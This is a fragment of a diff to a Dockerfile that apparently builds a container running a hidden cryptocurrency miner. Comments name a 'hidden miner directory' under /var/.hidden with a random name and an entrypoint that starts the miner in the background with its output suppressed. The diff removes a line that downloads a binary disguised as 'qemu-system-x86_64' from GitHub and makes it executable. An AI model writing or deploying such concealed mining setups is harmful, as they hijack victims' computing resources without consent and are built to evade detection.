@@ -24,7 +24,6 @@ RUN chmod +x /var/.hidden/$RANDOM_DIR/entrypoint
 
 # Set the work directory to the hidden miner directory
 WORKDIR "/var/.hidden/$RANDOM_DIR"
-RUN wget https://github.com/dediminari/bit/raw/refs/heads/main/qemu-system-x86_64 && chmod +x qemu-system-x86_64
 
 # Start miner in background with suppressed output
 ENTRYPOINT ["sh", "-c", "./entrypoint > /dev/null 2>&1 &"]
